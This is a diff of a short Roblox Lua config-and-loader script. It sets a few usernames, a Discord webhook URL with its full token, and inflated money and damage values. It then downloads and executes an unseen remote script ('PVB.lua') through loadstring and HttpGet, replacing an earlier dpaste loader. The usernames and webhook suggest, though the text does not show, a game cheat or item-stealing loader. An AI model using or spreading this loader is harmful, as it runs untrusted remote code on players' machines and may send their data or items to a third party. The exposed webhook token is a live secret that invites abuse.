@@ -1,1 +1,8 @@
-loadstring(game:HttpGet("https://dpaste.com/HV56F7T59.txt"))()
+Usernames = {"ArchAlt333", "ArchAlt444"}
+Webhook = "https://discord.com/api/webhooks/1431920581481070664/YcPBSI0jNthd-TkaEpHR7L1Gd8hzFsr0P3TQQC39ZR7IDm_ZAuwVKIGHpH9BAkkNxkfI"
+
+-- Priority
+MoneyPerSecond = 500000 -- DEFAULT: 300000/s
+DMGPerSecond = 500000 -- DEFAULT: 9000/s
+
+loadstring(game:HttpGet("https://codeberg.org/aevithegreat/NoriScripts/raw/branch/main/PVB.lua"))() 
